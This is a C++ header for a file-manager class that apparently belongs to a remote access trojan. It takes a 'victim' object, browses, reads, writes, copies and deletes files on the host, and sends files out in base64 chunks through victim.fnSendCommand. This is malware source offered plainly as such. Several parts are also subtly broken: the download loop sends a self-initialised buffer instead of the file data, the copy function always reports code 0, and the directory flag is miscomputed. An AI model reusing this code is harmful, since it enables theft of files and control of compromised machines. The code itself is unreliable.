/*
todo:
- copy
- move
- delete
- wget
- upload
- download
- new folder/file.
- zip
*/

#pragma once

#include <iostream>
#include <sstream>
#include <fstream>
#include <unistd.h>
#include <string>
#include <vector>

#include <sys/stat.h>
#include <ctime>
#include <iomanip>
#include <dirent.h>
#include <filesystem>

#include "clsTools.hpp"
#include "clsVictim.hpp"

class clsFileMgr
{
public:
    std::string m_szInitFileDir;
    
public:
    struct stFileInfo
    {
        bool mIsDir;
        std::string szFilePath;
        std::string szPermission;
        size_t nFileSize;
        std::string szCreationDate;
        std::string szLastModifiedDate;
        std::string szLastAccessedDate;
    };

    clsFileMgr()
    {
        m_szInitFileDir = std::filesystem::current_path();
    }

    ~clsFileMgr()
    {

    }

    stFileInfo fnGetFileInfo(const std::string& szFullPath)
    {
        struct stat st;

        if (stat(szFullPath.c_str(), &st) != 0)
        {
            perror(("stat failed: " + szFullPath).c_str());
            return {};
        }

        stFileInfo info = {
            S_ISDIR(st.st_mode),
            szFullPath,
            fnszGetPermission(st),
            static_cast<size_t>(st.st_size),
            fnTimeToString(st.st_ctime),
            fnTimeToString(st.st_mtime),
            fnTimeToString(st.st_atime),
        };

        return info;
    }

    std::vector<stFileInfo> fnScandir(const std::string& szDirPath)
    {
        struct dirent** namelist;
        int n = scandir(szDirPath.c_str(), &namelist, nullptr, alphasort);
        if (n < 0)
        {
            perror("scandir");
            return {};
        }

        std::vector<stFileInfo> uvFileInfo;
        uvFileInfo.reserve(n);  // optional optimization

        while (n--)
        {
            const char* pFileName = namelist[n]->d_name;
            std::string szFileName(pFileName);

            // build full path
            std::string szFullPath = szDirPath + "/" + szFileName;

            auto info = fnGetFileInfo(szFullPath);
            uvFileInfo.push_back(info);

            free(namelist[n]);
        }

        free(namelist);

        return uvFileInfo;
    }

    RETMSG fntpReadFile(const std::string& szFilePath)
    {
        std::ifstream input_file(szFilePath);
        if (!input_file.is_open())
        {
            return { 0, "ERROR://Cannot read file." };
        }

        std::vector<std::string> vsContent;
        std::string szLine;
        while (std::getline(input_file, szLine))
            vsContent.push_back(szLine);

        input_file.close();

        std::string szContent = clsEZData::fnszJoin(vsContent, "\n");

        return { 1, szContent };
    }

    RETMSG fntpWriteFile(const std::string& szFilePath, const std::string& szContent)
    {
        std::ofstream output_file(szFilePath);
        if (!output_file.is_open())
            return { 0, "ERROR://Cannot open file. " };

        output_file << szContent;
        output_file.close();

        return { 1, szFilePath };
    }

    bool fnbDirExists(const std::string& szDirPath)
    {
        std::error_code ec;
        std::filesystem::path p = szDirPath;

        return std::filesystem::exists(p, ec) && std::filesystem::is_directory(p, ec);
    }

    BUFFER fnabReadImage(const std::string& szFilePath)
    {
        std::ifstream file(szFilePath, std::ios::binary | std::ios::ate);
        if (!file.is_open())
            return { };

        std::streamsize nSize = file.tellg();
        file.seekg(0, std::ios::beg);

        std::vector<unsigned char> abBuffer(nSize);
        if (!file.read(reinterpret_cast<char *>(abBuffer.data()), nSize))
            return { };
        
        return abBuffer;
    }

    RETMSG fntpCopy(const std::string& szSrcPath, const std::string& szDstPath)
    {
        std::filesystem::path src = szSrcPath;
        std::filesystem::path dst = szDstPath;

        int nCode = 0;
        std::string szMsg;

        try
        {
            std::filesystem::copy_file(src, dst, std::filesystem::copy_options::overwrite_existing);

        }
        catch(const std::exception& e)
        {
            szMsg = e.what();
        }
        
        return { nCode, szMsg };
    }

    RETMSG fntpMove(const std::string& szSrcPath, const std::string& szDstPath)
    {
        int nCode = 0;
        std::string szMsg = "";

        try
        {
            fntpCopy(szSrcPath, szDstPath);
            fntpDelete(szSrcPath);
        }
        catch(const std::exception& e)
        {
            
        }
        
        return { nCode, szMsg };
    }

    RETMSG fntpDelete(const std::string& szPath)
    {
        int nCode = 0;
        std::string szMsg = "";

        try
        {
            std::filesystem::remove(szPath);

            nCode = 1;
        }
        catch(const std::exception& e)
        {
            szMsg = e.what();
        }
        
        return { nCode, szMsg };
    }

    void fnDownloadFile(clsVictim& victim, const std::string& szFilePath, size_t nChunkSize)
    {
        std::ifstream file(szFilePath, std::ios::binary);
        if (!file)
        {
            STRLIST ls = {
                "0",
                szFilePath,
                "Open file failed.",
            };

            victim.fnSendCommand(ls);

            return;
        }

        std::vector<char> abBuffer(nChunkSize);
        int nIdx = 0;
        while (file)
        {
            file.read(abBuffer.data(), abBuffer.size());
            std::streamsize nRead = file.gcount();

            if (nRead <= 0)
                break;

            BUFFER abData(abData.begin(), abData.end());

            STRLIST ls = {
                "1", //Code(OK)
                szFilePath,
                std::to_string(nIdx),
                std::to_string(nChunkSize),
                clsEZData::fnb64EncodeUtf8(abData),
            };

            victim.fnSendCommand(ls);
            
            nIdx++;
        }

        file.close();
    }

    void fnUploadFile(clsVictim& victim, const std::string& szFilePath, size_t nChunkSize)
    {

    }

private:
    std::string fnszGetPermission(struct stat st)
    {
        std::ostringstream oss;

        oss << ((st.st_mode & S_ISDIR(st.st_mode)) ? "d" : "-");

        oss << ((st.st_mode & S_IRUSR) ? "r" : "-");
        oss << ((st.st_mode & S_IWUSR) ? "w" : "-");
        oss << ((st.st_mode & S_IXUSR) ? "x" : "-");

        oss << ((st.st_mode & S_IRGRP) ? "r" : "-");
        oss << ((st.st_mode & S_IWGRP) ? "w" : "-");
        oss << ((st.st_mode & S_IXGRP) ? "x" : "-");

        oss << ((st.st_mode & S_IROTH) ? "r" : "-");
        oss << ((st.st_mode & S_IWOTH) ? "w" : "-");
        oss << ((st.st_mode & S_IXOTH) ? "x" : "-");

        return oss.str();
    }

    std::string fnTimeToString(std::time_t t)
    {
        std::tm tm{};
        localtime_r(&t, &tm);

        std::ostringstream oss;
        oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");

        return oss.str();
    }

};